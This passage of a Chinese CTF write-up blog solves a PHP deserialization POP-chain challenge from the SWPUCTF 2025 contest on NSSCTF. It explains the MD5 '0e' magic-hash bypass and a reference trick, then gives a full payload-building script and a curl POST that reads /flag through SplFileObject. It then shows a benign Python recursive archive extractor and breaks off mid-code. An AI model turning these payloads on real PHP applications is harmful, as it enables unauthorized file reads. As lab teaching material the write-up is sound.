class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>先卡类型与相等<br>必须都是字符串<br>还必须不全等：harukaze !== ysyy<br>再卡 MD5 “==” 比较<br>关键是：<br>md5($a) == md5($b)<br>注意是 ==，不是 ===。<br>PHP 的 == 会发生类型转换。只要 MD5 结果长得像科学计数法的 0：<br>“0e123456…” 会被当成数字 0<br>“0e999999…” 也会被当成数字 0<br>所以 0 == 0 为真<br>这就是著名的 “0e 魔术哈希”</p><p>成功后，把 acc 当函数调用。<br>如果 acc 是对象，PHP 会尝试调用对象 → 触发对象的 __invoke()</p><p>跳转到MISC：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MISC</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cr4p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cr4p-&gt;png = <span class="string">'010'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里对 $cr4p 对象做属性赋值：-&gt;png = ‘010’<br>如果 $cr4p 这个对象里 没有 png 这个属性，则会触发该对象的 __set($name,$value)。<br>题目里正好只有 CRYPTO 有 __set。</p><p>跳转到CRYPTO：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CRYPTO</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kyarihoshi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rocage</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dance</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dance = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;last === <span class="variable language_">$this</span>-&gt;dance){</span><br><span class="line">            <span class="variable">$kiss</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">kyarihoshi</span>(<span class="variable">$this</span>-&gt;rocage);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"<span class="subst">$kiss</span>&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"恭喜！&lt;br&gt;"</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"LAST DANCE!"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>dance = md5(rand()) + last === dance<br>dance 是随机生成的<br>last 必须严格等于 dance 才能走到 new …<br>如果你正常思路：你不可能预知 rand()<br>所以出题人故意逼你想“trick”。</p><p>这个 trick 就是：引用（Reference）<br>如果你让：<br>$last 和 $dance 是同一个引用（指向同一个 zval）<br>那么当 dance 被赋新值时，last 也同步变成同一个值，于是：<br>last === dance 必然为真（甚至是同一个变量）<br>这就是这题最巧的点：用引用绕过随机性 + 严格比较。</p><p>你可以控制：<br>kyarihoshi：类名字符串<br>rocage：构造参数<br>于是你可以选一个 内置类，让 echo $kiss 输出你想要的东西。<br>最典型就是：<br>SplFileObject($path)：读文件内容（很多环境 echo 时能输出行）<br>或 FilesystemIterator(‘glob:///…’)：枚举文件名（你之前就用它爆出了 flag 这个名字）<br>所以出题人的最终目标是：<br>让你用动态 new + echo 打印 flag 文件的内容（或通过迭代器枚举定位 flag）。</p><p>最终解题脚本：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WEB</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sauy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$creambread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$sauy</span></span>) </span>{ <span class="variable language_">$this</span>-&gt;sauy = <span class="variable">$sauy</span>; }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">REVERSE</span> </span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$re1sen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$harukaze</span> = <span class="string">'QNKCDZO'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ysyy</span> = <span class="string">'s878926199a'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$acc</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PWN</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wings</span> = <span class="string">'SHENG-YI'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c0trick</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;wings === <span class="string">'SHENG-YI'</span>){</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;c0trick-&gt;<span class="title function_ invoke__">MinatoNamikaze</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"NSS WELCOME YOU!!!"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"No wings,no fly!"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MISC</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cr4p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{ <span class="variable language_">$this</span>-&gt;cr4p-&gt;png = <span class="string">'010'</span>; }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CRYPTO</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kyarihoshi</span> = <span class="string">'SplFileObject'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rocage</span> = <span class="string">'/flag'</span>;  <span class="comment">// 你自己后续根据环境改</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dance</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiss</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$crypto</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CRYPTO</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ✅ 关键修复：先给 dance 一个占位值，再做引用</span></span><br><span class="line"><span class="comment"> * 这样序列化里 last 和 dance 才会都变成 R:xx 引用结构，更稳定</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$crypto</span>-&gt;dance = <span class="string">'seed'</span>;</span><br><span class="line"><span class="variable">$crypto</span>-&gt;last  =&amp; <span class="variable">$crypto</span>-&gt;dance;</span><br><span class="line"></span><br><span class="line"><span class="variable">$misc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">MISC</span>();</span><br><span class="line"><span class="variable">$misc</span>-&gt;cr4p = <span class="variable">$crypto</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$reverse</span> = <span class="keyword">new</span> <span class="title function_ invoke__">REVERSE</span>();</span><br><span class="line"><span class="variable">$reverse</span>-&gt;acc = <span class="variable">$misc</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pwn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PWN</span>();</span><br><span class="line"><span class="variable">$pwn</span>-&gt;c0trick = <span class="variable">$reverse</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$web</span> = <span class="keyword">new</span> <span class="title function_ invoke__">WEB</span>(<span class="variable">$pwn</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$web</span>));</span><br></pre></td></tr></tbody></table></figure><p>运行得出的结果赋值给NSS</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">curl -s -X POST -d <span class="string">"NSS=O%3A3%3A%22WEB%22%3A2%3A%7Bs%3A9%3A%22%00WEB%00sauy%22%3BO%3A3%3A%22PWN%22%3A2%3A%7Bs%3A5%3A%22wings%22%3Bs%3A8%3A%22SHENG-YI%22%3Bs%3A7%3A%22c0trick%22%3BO%3A7%3A%22REVERSE%22%3A4%3A%7Bs%3A9%3A%22%00%2A%00re1sen%22%3BN%3Bs%3A8%3A%22harukaze%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A4%3A%22ysyy%22%3Bs%3A11%3A%22s878926199a%22%3Bs%3A3%3A%22acc%22%3BO%3A4%3A%22MISC%22%3A1%3A%7Bs%3A4%3A%22cr4p%22%3BO%3A6%3A%22CRYPTO%22%3A5%3A%7Bs%3A10%3A%22kyarihoshi%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22rocage%22%3Bs%3A5%3A%22%2Fflag%22%3Bs%3A4%3A%22last%22%3Bs%3A4%3A%22seed%22%3Bs%3A5%3A%22dance%22%3BR%3A12%3Bs%3A4%3A%22kiss%22%3BN%3B%7D%7D%7D%7Ds%3A10%3A%22creambread%22%3BN%3B%7D"</span> http://node1.anna.nssctf.cn:28727</span><br></pre></td></tr></tbody></table></figure><p>然后就会输出flag：</p><p><img src="https://a1.boltp.com/2026/02/01/697f0cf4e713f.png" alt="得到flag"></p><hr><h2 id="⭐️-05-SWPUCTF-2025-秋季新生赛-Are-u-“脚本小子”？"><a href="#⭐️-05-SWPUCTF-2025-秋季新生赛-Are-u-“脚本小子”？" class="headerlink" title="⭐️ 05 [SWPUCTF 2025 秋季新生赛]Are u “脚本小子”？"></a>⭐️ 05 [SWPUCTF 2025 秋季新生赛]Are u “脚本小子”？</h2><p>🚩flag：<code>NSSCTF{WoW_u_a4e_py7h0n_m4ster!}</code></p><p>💡hint：<code>misc</code> </p><p>🔧tool：<code>python</code></p><p>Mac自带软件自动解压ing（bushi<br><img src="https://a1.boltp.com/2026/02/01/697f0de22ffc8.png" alt="Mac自带软件自动解压ing（bushi"></p><p>然后跑完就得到flag了。</p><p>正经脚本解法如下：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">recursive_extract.py</span></span><br><span class="line"><span class="string">递归解压嵌套型压缩包（多种格式），并在解压后继续扫描新文件直到无可解压项或达到限制。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">支持（内置）：</span></span><br><span class="line"><span class="string">- .zip</span></span><br><span class="line"><span class="string">- .tar, .tar.gz/.tgz, .tar.bz2/.tbz2, .tar.xz/.txz</span></span><br><span class="line"><span class="string">- .gz (单文件 gzip)</span></span><br><span class="line"><span class="string">- .bz2 (单文件 bzip2)</span></span><br><span class="line"><span class="string">- .xz (单文件 xz)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">可选支持（自动探测）：</span></span><br><span class="line"><span class="string">- .7z  (优先 py7zr，其次系统 7z/7za)</span></span><br><span class="line"><span class="string">- .rar (系统 unar/7z)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> bz2</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> lzma</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Iterable, <span class="type">Optional</span>, <span class="type">Set</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ARCHIVE_EXTS = {</span><br><span class="line">    <span class="string">".zip"</span>,</span><br><span class="line">    <span class="string">".tar"</span>, <span class="string">".tgz"</span>, <span class="string">".tar.gz"</span>, <span class="string">".tbz2"</span>, <span class="string">".tar.bz2"</span>, <span class="string">".txz"</span>, <span class="string">".tar.xz"</span>,</span><br><span class="line">    <span class="string">".gz"</span>, <span class="string">".bz2"</span>, <span class="string">".xz"</span>,</span><br><span class="line">    <span class="string">".7z"</span>, <span class="string">".rar"</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">which</span>(<span class="params">cmd: <span class="built_in">str</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">return</span> shutil.which(cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_archive</span>(<span class="params">path: Path</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    name = path.name.lower()</span><br><span class="line">    <span class="comment"># 处理双后缀</span></span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> (<span class="string">".tar.gz"</span>, <span class="string">".tar.bz2"</span>, <span class="string">".tar.xz"</span>):</span><br><span class="line">        <span class="keyword">if</span> name.endswith(ext):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 单后缀</span></span><br><span class="line">    <span class="keyword">return</span> path.suffix.lower() <span class="keyword">in</span> ARCHIVE_EXTS <span class="keyword">or</span> name.endswith((<span class="string">".tgz"</span>, <span class="string">".tbz2"</span>, <span class="string">".txz"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">norm_ext</span>(<span class="params">path: Path</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    name = path.name.lower()</span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> (<span class="string">".tar.gz"</span>, <span class="string">".tar.bz2"</span>, <span class="string">".tar.xz"</span>):</span><br><span class="line">        <span class="keyword">if</span> name.endswith(ext):</span><br><span class="line">            <span class="keyword">return</span> ext</span><br><span class="line">    <span class="keyword">if</span> name.endswith(<span class="string">".tgz"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">".tar.gz"</span></span><br><span class="line">    <span class="keyword">if</span> name.endswith(<span class="string">".tbz2"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">".tar.bz2"</span></span><br><span class="line">    <span class="keyword">if</span> name.endswith(<span class="string">".txz"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">".tar.xz"</span></span><br><span class="line">    <span class="keyword">return</span> path.suffix.lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_join</span>(<span class="params">base: Path, target: Path</span>) -&gt; Path:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    防 ZipSlip：确保 target 解压到 base 下</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    base_resolved = base.resolve()</span><br><span class="line">    out = (base_resolved / target).resolve()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">str</span>(out).startswith(<span class="built_in">str</span>(base_resolved) + os.sep) <span class="keyword">and</span> out != base_resolved:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f"Blocked path traversal: <span class="subst">{target}</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Limits</span>:</span><br><span class="line">    max_depth: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line">    max_files: <span class="built_in">int</span> = <span class="number">20000</span></span><br><span class="line">    max_bytes: <span class="built_in">int</span> = <span class="number">2_000_000_000</span>  <span class="comment"># 2GB 默认上限</span></span><br><span class="line">    overwrite: <span class="built_in">bool</span> = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stats</span>:</span><br><span class="line">    files_written: <span class="built_in">int</span> = <span class="number">0</span></span><br><span class="line">    bytes_written: <span class="built_in">int</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExtractError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ensure_limits</span>(<span class="params">stats: Stats, limits: Limits, add_files: <span class="built_in">int</span> = <span class="number">0</span>, add_bytes: <span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> stats.files_written + add_files &gt; limits.max_files:</span><br><span class="line">        <span class="keyword">raise</span> ExtractError(<span class="string">f"Exceeded max_files: <span class="subst">{limits.max_files}</span>"</span>)</span><br><span class="line">    <span class="keyword">if</span> stats.bytes_written + add_bytes &gt; limits.max_bytes:</span><br><span class="line">        <span class="keyword">raise</span> ExtractError(<span class="string">f"Exceeded max_bytes: <span class="subst">{limits.max_bytes}</span>"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_bytes_atomic</span>(<span class="params">dst: Path, data: <span class="built_in">bytes</span>, overwrite: <span class="built_in">bool</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> dst.exists() <span class="keyword">and</span> <span class="keyword">not</span> overwrite:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    dst.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    tmp = dst.with_suffix(dst.suffix + <span class="string">".tmp"</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(tmp, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line">    os.replace(tmp, dst)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">src: Path, out_dir: Path, stats: Stats, limits: Limits</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(src) <span class="keyword">as</span> zf:</span><br><span class="line">        infos = zf.infolist()</span><br><span class="line">        ensure_limits(stats, limits, add_files=<span class="built_in">len</span>(infos))</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> infos:</span><br><span class="line">            name = info.filename</span><br><span class="line">            <span class="keyword">if</span> name.endswith(<span class="string">"/"</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># Zip 内部路径可能包含反斜杠</span></span><br><span class="line">            rel = Path(name.replace(<span class="string">"\\"</span>, <span class="string">"/"</span>))</span><br><span class="line">            dst = safe_join(out_dir, rel)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 估算体积（ZipInfo.file_size 为解压后大小）</span></span><br><span class="line">            ensure_limits(stats, limits, add_files=<span class="number">0</span>, add_bytes=info.file_size)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dst.exists() <span class="keyword">and</span> <span class="keyword">not</span> limits.overwrite:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dst.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">with</span> zf.<span class="built_in">open</span>(info, <span class="string">"r"</span>) <span class="keyword">as</span> r, <span class="built_in">open</span>(dst, <span class="string">"wb"</span>) <span class="keyword">as</span> w:</span><br><span class="line">                shutil.copyfileobj(r, w)</span><br><span class="line"></span><br><span class="line">            stats.files_written += <span class="number">1</span></span><br><span class="line">            stats.bytes_written += info.file_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_tar</span>(<span class="params">src: Path, out_dir: Path, stats: Stats, limits: Limits</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># tarfile 自动识别 gz/bz2/xz</span></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(src, mode=<span class="string">"r:*"</span>) <span class="keyword">as</span> tf:</span><br><span class="line">        members = [m <span class="keyword">for</span> m <span class="keyword">in</span> tf.getmembers() <span class="keyword">if</span> m.isfile() <span class="keyword">or</span> m.islnk() <span class="keyword">or</span> m.issym()]</span><br><span class="line">        ensure_limits(stats, limits, add_files=<span class="built_in">len</span>(members))</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> members:</span><br><span class="line">            rel = Path(m.name)</span><br><span class="line">            dst = safe_join(out_dir, rel)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 估算体积：m.size（对文件有效）</span></span><br><span class="line">            <span class="keyword">if</span> m.isfile():</span><br><span class="line">                ensure_limits(stats, limits, add_bytes=m.size)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dst.exists() <span class="keyword">and</span> <span class="keyword">not</span> limits.overwrite:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dst.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 对符号链接/硬链接：为安全起见，直接跳过（也可改成处理）</span></span><br><span class="line">            <span class="keyword">if</span> m.issym() <span class="keyword">or</span> m.islnk():</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            f = tf.extractfile(m)</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">with</span> f, <span class="built_in">open</span>(dst, <span class="string">"wb"</span>) <span class="keyword">as</span> w:</span><br><span class="line">                shutil.copyfileobj(f, w)</span><br><span class="line"></span><br><span class="line">            stats.files_written += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> m.isfile():</span><br><span class="line">                stats.bytes_written += m.size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_single_stream</span>(<span class="params"></span></span><br><span class="line"><span class="params">    src: Path, out_dir: Path, stats: Stats, limits: Limits, kind: <span class="built_in">str</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    处理 .gz/.bz2/.xz 这种“单文件压缩”（不是 tar）</span></span><br><span class="line"><span class="string">    约定输出文件名：去掉该后缀</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    suffix = src.suffix.lower()</span><br><span class="line">    <span class="comment"># 输出文件名：去掉最后一个后缀</span></span><br><span class="line">    out_name = src.name[: -<span class="built_in">len</span>(suffix)]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> out_name:</span><br><span class="line">        out_name = src.stem <span class="keyword">or</span> (src.name + <span class="string">".out"</span>)</span><br><span class="line">    dst = safe_join(out_dir, Path(out_name))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> dst.exists() <span class="keyword">and</span> <span class="keyword">not</span> limits.overwrite:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解压到内存会有风险，改为流式写入并统计</span></span><br><span class="line">    dst.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    opener = {</span><br><span class="line">        <span class="string">"gz"</span>: gzip.<span class="built_in">open</span>,</span><br><span class="line">        <span class="string">"bz2"</span>: bz2.<span class="built_in">open</span>,</span><br><span class="line">        <span class="string">"xz"</span>: lzma.<span class="built_in">open</span>,</span><br><span class="line">    }[kind]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 边解边写，边统计（防炸弹：超过 max_bytes 就中止）</span></span><br><span class="line">    written = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> opener(src, <span class="string">"rb"</span>) <span class="keyword">as</span> r, <span class="built_in">open</span>(dst, <span class="string">"wb"</span>) <span class="keyword">as</span> w:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = r.read(<span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            written += <span class="built_in">len</span>(chunk)</span><br><span class="line">            ensure_limits(stats, limits, add_bytes=<span class="built_in">len</span>(chunk))</span><br><span class="line">            w.write(chunk)</span><br><span class="line"></span><br><span class="line">    stats.files_written += <span class="number">1</span></span><br><span class="line">    stats.bytes_written += written</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_7z_with_py7zr</span>(<span class="params">src: Path, out_dir: Path, stats: Stats, limits: Limits</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> py7zr  <span class="comment"># type: ignore</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> py7zr.SevenZipFile(src, mode=<span class="string">"r"</span>) <span class="keyword">as</span> z:</span><br><span class="line">        <span class="comment"># py7zr 不容易在不解压前拿到所有文件大小，先做文件数限制</span></span><br><span class="line">        names = z.getnames()</span><br><span class="line">        ensure_limits(stats, limits, add_files=<span class="built_in">len</span>(names))</span><br><span class="line">        z.extractall(path=out_dir)</span><br><span class="line">        <span class="comment"># 事后统计大小（粗略）</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> names:</span><br><span class="line">            p = (out_dir / n)</span><br><span class="line">            <span class="keyword">if</span> p.is_file():</span><br><span class="line">                sz = p.stat().st_size</span><br><span class="line">                ensure_limits(stats, limits, add_bytes=sz)</span><br><span class="line">                stats.files_written += <span class="number">1</span></span><br><span class="line">                stats.bytes_written += sz</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_with_command</span>(<span class="params">cmd: <span class="built_in">str</span>, src: Path, out_dir: Path</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    使用外部命令解压（7z/unar）。外部命令可能会创建子目录或直接输出。</span></span><br><span class="line"><span class="string">    这里不做体积统计（已经有全局限制可控制深度/文件数，且外部工具不同难以统一）。</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    out_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cmd <span class="keyword">in</span> (<span class="string">"7z"</span>, <span class="string">"7za"</span>):</span><br><span class="line">        <span class="comment"># 7z x -oOUT SRC</span></span><br><span class="line">        p = subprocess.run([cmd, <span class="string">"x"</span>, <span class="string">f"-o<span class="subst">{<span class="built_in">str</span>(out_dir)}</span>"</span>, <span class="string">"-y"</span>, <span class="built_in">str</span>(src)],</span><br><span class="line">                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> p.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ExtractError(<span class="string">f"<span class="subst">{cmd}</span> failed:\n<span class="subst">{p.stdout}</span>"</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">"unar"</span>:</span><br><span class="line">        <span class="comment"># unar -o OUT SRC</span></span><br><span class="line">        p = subprocess.run([cmd, <span class="string">"-o"</span>, <span class="built_in">str</span>(out_dir), <span class="built_in">str</span>(src)],</span><br><span class="line">                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> p.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ExtractError(<span class="string">f"unar failed:\n<span 